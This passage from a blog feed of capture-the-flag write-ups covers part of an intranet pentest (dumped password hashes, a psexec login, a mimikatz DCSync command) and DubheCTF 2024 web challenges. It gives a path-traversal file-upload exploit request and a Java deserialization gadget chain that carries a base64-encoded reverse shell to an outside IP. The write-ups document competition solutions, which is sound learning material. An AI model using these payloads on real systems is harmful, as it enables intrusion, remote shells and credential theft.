e09c3dfc9c6efe284d857c058dc1db55</span><br><span class="line">    02  fbf9a181b276a735c3aa2dadd77e134c</span><br><span class="line">    03  abfd5c1956c049d4790c90d77e679564</span><br><span class="line">    04  e09c3dfc9c6efe284d857c058dc1db55</span><br><span class="line">    05  01b9558961ba8e6d3e242ad0a573daaf</span><br><span class="line">    06  421fafa7082865ce50c3d8f5a09172aa</span><br><span class="line">    07  3b33abf4513bdc142aeff14dcc44bb6c</span><br><span class="line">    08  67801cafacc256dbffa5b6550f3eb98d</span><br><span class="line">    09  eca500dc4bf4100b73d1adcbdc4fdef6</span><br><span class="line">    10  dc6a3d5522ca864a8668b3c1a49255b1</span><br><span class="line">    11  d692f02402a8f38e6c242af609bedc45</span><br><span class="line">    12  67801cafacc256dbffa5b6550f3eb98d</span><br><span class="line">    13  2c4c7abb5884d0554c33a355a9f7c21e</span><br><span class="line">    14  299c1210a681d700eb7840ce54808648</span><br><span class="line">    15  94dd87c64e01028a3d5f07af9ea9aa76</span><br><span class="line">    16  36e79452fc63c6af5f08f158fb788622</span><br><span class="line">    17  afc9d511a5dfcf8e41fa37f38ecc6af7</span><br><span class="line">    18  fd2dbb5552b731a4a78c103dfe64e3f1</span><br><span class="line">    19  db7b0bbeb4937dcb8ce461265a10b21e</span><br><span class="line">    20  7358a3b9387c41e5da0b7f2d769fe5d2</span><br><span class="line">    21  b9d78e29e532a095144a1eb0c829b255</span><br><span class="line">    22  192b18e2b0cd9b907936385b8bda7b36</span><br><span class="line">    23  ba08bed581e1da740999962c6a39ae91</span><br><span class="line">    24  f4afecc454a2b6decc5e9a934ba5db4b</span><br><span class="line">    25  f095e8a655cad918f5606bb764daea95</span><br><span class="line">    26  702cbf78e979f2914a877d8c53f18862</span><br><span class="line">    27  bbca37af1d189426db4899dc8f750150</span><br><span class="line">    28  ef2d30ad6765b5f13c65ade611e33312</span><br><span class="line">    29  b0aa1ed6b84d876eb160b8f30c5b40a4</span><br></pre></td></tr></table></figure><p>然后psexec登上去捏<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697731494984-6a8823e3-4f7f-463b-bfb0-9753ac50c3e2.png#averageHue=%234b4f59&clientId=u7b19f8ec-faf4-4&from=paste&height=254&id=VJdgc&originHeight=318&originWidth=1218&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=502125&status=done&style=none&taskId=u74493289-d3f2-44cf-bc28-030a065d2e9&title=&width=974.4" alt="image.png"><br>拿下捏</p><h1 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h1><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:xiaorang.lab&quot; &gt;7.log</code><br>在lumia用户有个secret.zip，纯纯misc我就不做了。。。<br>时间就是金钱啊！<br><code>flag&#123;cf0c753c-233f-4729-8984-0746ea5878b7&#125;</code></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1697731861987-ec8a1f0f-b279-4b04-ad57-951c98d01024.png#averageHue=%23181d29&clientId=u7b19f8ec-faf4-4&from=paste&height=726&id=u5418e9a6&originHeight=907&originWidth=1867&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=463070&status=done&style=none&taskId=u8c0da80b-3140-499c-9f9d-5c941e47971&title=&width=1493.6" alt="image.png"></p>]]></content>
    
    
    <summary type="html">内网渗透</summary>
    
    
    
    <category term="WriteUp" scheme="http://boogipop.com/categories/WriteUp/"/>
    
    
    <category term="内网" scheme="http://boogipop.com/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="#Java" scheme="http://boogipop.com/tags/Java/"/>
    
    <category term="#FastJson" scheme="http://boogipop.com/tags/FastJson/"/>
    
    <category term="#private" scheme="http://boogipop.com/tags/private/"/>
    
  </entry>
  
  <entry>
    <title>DubheCTF 2024 Web Writeup</title>
    <link href="http://boogipop.com/2024/03/19/DubheCTF%202024%20Web%20Writeup/"/>
    <id>http://boogipop.com/2024/03/19/DubheCTF%202024%20Web%20Writeup/</id>
    <published>2024-03-19T14:14:25.720Z</published>
    <updated>2024-03-19T14:15:35.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wecat"><a href="#Wecat" class="headerlink" title="Wecat"></a>Wecat</h1><p>考点：</p><ul><li>nodemon 热部署</li><li>文件上传覆盖</li><li>权限绕过</li></ul><p>一开始看这一题的代码感觉还挺难的，结果仔细一看发现非常之简单啊。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">JsonWebToken</span> = <span class="built_in">require</span>(<span class="string">&#x27;../module/jwt&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="keyword">new</span> <span class="title class_">JsonWebToken</span>()</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 验证token</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">verifyToken</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/(login|sign|static)/g</span>.<span class="title function_">test</span>(ctx.<span class="property">url</span>)) <span class="keyword">return</span> <span class="title function_">next</span>() <span class="comment">// 登录、注册、获取静态文件不需要验证权限</span></span><br><span class="line">    <span class="keyword">const</span> verify = <span class="keyword">await</span> jwt.<span class="title function_">tokenVerify</span>(ctx)</span><br><span class="line">    ctx.<span class="property">status</span> = <span class="number">200</span></span><br><span class="line">    <span class="keyword">if</span> (verify === <span class="number">401</span>) &#123; <span class="comment">// 验证不通过</span></span><br><span class="line">      ctx.<span class="property">body</span> = &#123;</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;身份认证已过期&#x27;</span>,</span><br><span class="line">        <span class="attr">error</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">type</span>: verify</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开局我看到了个鉴权的模块，首先key也给你了，然后还加了个没用的if。然后我注意到了dockerfile一个启动文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710834908806-24f0cd15-7223-4554-bdce-284a5a1588ee.png#averageHue=%23232528&clientId=u51b156d6-971a-4&from=paste&height=969&id=u34a2bf94&originHeight=1938&originWidth=3362&originalType=binary&ratio=2&rotation=0&showTitle=false&size=503052&status=done&style=none&taskId=u548d7697-4b0b-4775-ac77-078934d56c7&title=&width=1681" alt="image.png"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:alpine</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> server .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> readflag /readflag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 400 /flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +xs /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser -D player</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R player:player /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> player</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm i</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3800</span> <span class="number">4800</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;npm&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;dev&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>结合上述2个文件可以知道，使用的是nodemon进行的热部署启动，这时候凭直觉就是文件覆盖了。并且不需要考虑权限问题，因为session本地可以制作。直接找点位就行了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710834989406-3f038bb3-bf18-413d-8639-d3a83a8d0ddd.png#averageHue=%231f2124&clientId=u51b156d6-971a-4&from=paste&height=399&id=ud8d50152&originHeight=798&originWidth=2306&originalType=binary&ratio=2&rotation=0&showTitle=false&size=201613&status=done&style=none&taskId=uec847c3d-4c59-4036-ba63-44f4be9220e&title=&width=1153" alt="image.png"><br>该api有字符串拼贴，可以任意文件读取。但其实没什么用，我们最后需要rce。找文件上传的点位<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710835173982-1f90b5f5-da0f-46c1-9fc6-b30b07a09ec5.png#averageHue=%23212326&clientId=u51b156d6-971a-4&from=paste&height=399&id=u75cd6778&originHeight=798&originWidth=2306&originalType=binary&ratio=2&rotation=0&showTitle=false&size=194379&status=done&style=none&taskId=u3fd70cf0-f0cb-4793-b2d0-fed22f8ff1d&title=&width=1153" alt="image.png"><br><code>/wechatAPI/upload/once</code><br>该处postfix可以拼贴，可以文件覆盖和上传。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wechatAPI/upload/once</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8088</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA4MzkwNzksImRhdGEiOiIxcGFzcyIsImlhdCI6MTcxMDgzNTQ3OX0.9I40cxAGdiKqjYbecTdKLuVxNOnJQA774LTP1YEHSYU</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>208</span><br><span class="line"></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span></span></span><br><span class="line"><span class="language-moonscript">Content-<span class="name">Disposition</span>: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;getflag.js&quot;</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">const router = <span class="built_in">require</span>(<span class="string">&#x27;@koa/router&#x27;</span>)()</span></span><br><span class="line"><span class="language-moonscript">const child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">router.get(<span class="string">&#x27;/wechatAPI/getflag&#x27;</span>, <span class="function"><span class="params">(ctx)</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-moonscript">    var flag = child_process.execFileSync(<span class="string">&quot;/readflag&quot;</span>).toString()</span></span><br><span class="line"><span class="language-moonscript">    ctx.status = <span class="number">200</span></span></span><br><span class="line"><span class="language-moonscript">    ctx.body = &#123;</span></span><br><span class="line"><span class="language-moonscript">        <span class="name">msg</span>: flag</span></span><br><span class="line"><span class="language-moonscript">    &#125;</span></span><br><span class="line"><span class="language-moonscript">&#125;)</span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript"><span class="built_in">module</span>.exports = router.routes()</span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span></span></span><br><span class="line"><span class="language-moonscript">Content-<span class="name">Disposition</span>: form-data; name=<span class="string">&quot;name&quot;</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">getflag.js</span></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span></span></span><br><span class="line"><span class="language-moonscript">Content-<span class="name">Disposition</span>: form-data; name=<span class="string">&quot;hash&quot;</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">/.</span></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a</span></span></span><br><span class="line"><span class="language-moonscript">Content-<span class="name">Disposition</span>: form-data; name=<span class="string">&quot;postfix&quot;</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br><span class="line"><span class="language-moonscript">/../src/route/getflag.js</span></span><br><span class="line"><span class="language-moonscript"><span class="comment">--ca289939f36ddbb1998bf4928b9bf703a1a6216d638583b068fa46969e7a--</span></span></span><br><span class="line"><span class="language-moonscript"></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710836167432-1344783e-9941-44be-8f8c-ab1aa2fa5b4d.png#averageHue=%23000000&clientId=u51b156d6-971a-4&from=paste&height=637&id=u4b0b511f&originHeight=1274&originWidth=2000&originalType=binary&ratio=2&rotation=0&showTitle=false&size=187331&status=done&style=none&taskId=ucb593c00-ac65-468e-8538-195f252a89b&title=&width=1000" alt="image.png"><br>可以看到getflag.js已经文件上传了，接下来我们需要去覆盖一下router.js<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710836266918-332b02de-0e33-46e6-bf98-907db25d63ac.png#averageHue=%23edeff3&clientId=u51b156d6-971a-4&from=paste&height=829&id=u35ac7f13&originHeight=1658&originWidth=2848&originalType=binary&ratio=2&rotation=0&showTitle=false&size=598849&status=done&style=none&taskId=udf7f6e0e-bc7b-44fa-a655-596bd1b6692&title=&width=1424" alt="image.png"><br>最后访问&#x2F;getflag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710836451619-ead0c851-4cb6-495f-8002-7611c3e3998d.png#averageHue=%23698284&clientId=u51b156d6-971a-4&from=paste&height=620&id=uaa5979eb&originHeight=1240&originWidth=2478&originalType=binary&ratio=2&rotation=0&showTitle=false&size=388564&status=done&style=none&taskId=ud8e6565d-5c19-4271-b7ac-ce42f37752d&title=&width=1239" alt="image.png"></p><h1 id="Javolution"><a href="#Javolution" class="headerlink" title="Javolution"></a>Javolution</h1><p>考点</p><ul><li>Jdk17</li><li>Tera Jdbc RCE</li><li>整形溢出</li></ul><p>漏洞路由出现在这里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123;&quot;/cheat&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">cheatPlus</span><span class="params">(String host, String data)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">secretKey</span> <span class="operator">=</span> <span class="string">&quot;dubhe&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.palService.getPlayer().getLevel() &gt;= <span class="number">50</span> &amp;&amp; host != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> local;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InetAddress</span> <span class="variable">address</span> <span class="operator">=</span> InetAddress.getByName(host);</span><br><span class="line">                local = address.isLoopbackAddress();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Bad Host!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (local &amp;&amp; host.contains(secretKey)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.palService.genPal(data);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;You are now invincible !&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Only localhost is allowed to cheat !&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You are too young to cheat !&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后会直接进行base64 反序列化<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710837446962-c88c7fdf-31bc-4c9f-897f-1365c0269f3b.png#averageHue=%23212326&clientId=u51b156d6-971a-4&from=paste&height=289&id=u18bc1280&originHeight=578&originWidth=2264&originalType=binary&ratio=2&rotation=0&showTitle=false&size=130944&status=done&style=none&taskId=u92d018b4-0c08-45ba-9f21-ba7d48f4ca2&title=&width=1132" alt="image.png"><br>直接先分析利用链如何构造。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710837477804-c5ed12ad-d52e-4df7-b703-8b0bdc381852.png#averageHue=%23303337&clientId=u51b156d6-971a-4&from=paste&height=836&id=uebe64506&originHeight=1672&originWidth=1308&originalType=binary&ratio=2&rotation=0&showTitle=false&size=321741&status=done&style=none&taskId=u5eb2bcff-b02c-4be6-8e02-bf07c7247c7&title=&width=654" alt="image.png"><br>jackson加上terajdbc依赖，rce应该看的就是tera了，科学上网一波<br><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC?tab=readme-ov-file">https://github.com/luelueking/Deserial_Sink_With_JDBC?tab&#x3D;readme-ov-file</a><br>这里有有关tera的利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator&quot;</span>;</span><br><span class="line"><span class="type">TeraDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TeraDataSource</span>();</span><br><span class="line">dataSource.setBROWSER(command);</span><br><span class="line">dataSource.setLOGMECH(<span class="string">&quot;BROWSER&quot;</span>);</span><br><span class="line">dataSource.setDSName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">dataSource.setDbsPort(<span class="string">&quot;10250&quot;</span>);</span><br></pre></td></tr></table></figure><p>前半段就是getter触发getconenction<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710838037051-28efe1cb-f69c-409c-9d9a-f6f4fcff2073.png#averageHue=%23212225&clientId=u51b156d6-971a-4&from=paste&height=436&id=ubaaca9e9&originHeight=872&originWidth=2462&originalType=binary&ratio=2&rotation=0&showTitle=false&size=179552&status=done&style=none&taskId=uc0c8d2ae-73cc-4c4b-969a-c8124295f7c&title=&width=1231" alt="image.png"><br>我们需要进入下面的getconenction，所以getter放置的类应该是题目给的一个类叫做<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710838062734-bf05984c-aa70-4f79-b9e0-e895e7b1b5c7.png#averageHue=%23212225&clientId=u51b156d6-971a-4&from=paste&height=470&id=ucb215cb9&originHeight=940&originWidth=1808&originalType=binary&ratio=2&rotation=0&showTitle=false&size=187349&status=done&style=none&taskId=u569c11de-ba27-4f75-a688-ec306064ad1&title=&width=904" alt="image.png"><br>他也有getconnection。接下来让我们构造一下java17的jackson链，这里有个比较崭新的trick，我们可以通过java的option开启模块，反序列化并不会检验。。。我才知道，所以绕过什么module似乎没有意义了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.teradata.jdbc.TeraDataSource;</span><br><span class="line"><span class="keyword">import</span> com.teradata.jdbc.TeraDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.dubhe.javolution.pool.PalDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3NyA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//        String command = &quot;open -a Calculator&quot;;</span></span><br><span class="line">        <span class="type">TeraDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TeraDataSource</span>();</span><br><span class="line">        dataSource.setBROWSER(command);</span><br><span class="line">        dataSource.setLOGMECH(<span class="string">&quot;BROWSER&quot;</span>);</span><br><span class="line">        dataSource.setDSName(<span class="string">&quot;8.130.24.188&quot;</span>);</span><br><span class="line">        dataSource.setDbsPort(<span class="string">&quot;10250&quot;</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(dataSource);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;DataSource.class&#125;, handler);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;123&quot;</span>));</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jsonNodes);</span><br><span class="line">        <span class="comment">// 执行序列化与反序列化，并且返回序列化数据</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = SerializeUtils.makeMap(h1, h2);</span><br><span class="line">        System.out.println(SerializeUtils.base64serial(map));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链构造如上，需要注意的是咱们用代理区稳定触发一下getconnection，jackson调用getter是无参的。<br>我们再来看一下这道题的其他逻辑<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710840162526-7543efcf-a25a-4ad7-abc5-a45fd82b2b8f.png#averageHue=%23242529&clientId=u51b156d6-971a-4&from=paste&height=314&id=u06356c32&originHeight=628&originWidth=1300&originalType=binary&ratio=2&rotation=0&showTitle=false&size=133276&status=done&style=none&taskId=ue20d898b-bbb0-4a1c-9bd0-94dd85edb3a&title=&width=650" alt="image.png"><br>首先host不为空，然后player的level需要大于50，这一个逻辑我们来看一下<br>攻击者可以设置自己的防御力和其他属性，最后进入battle模式<br><img 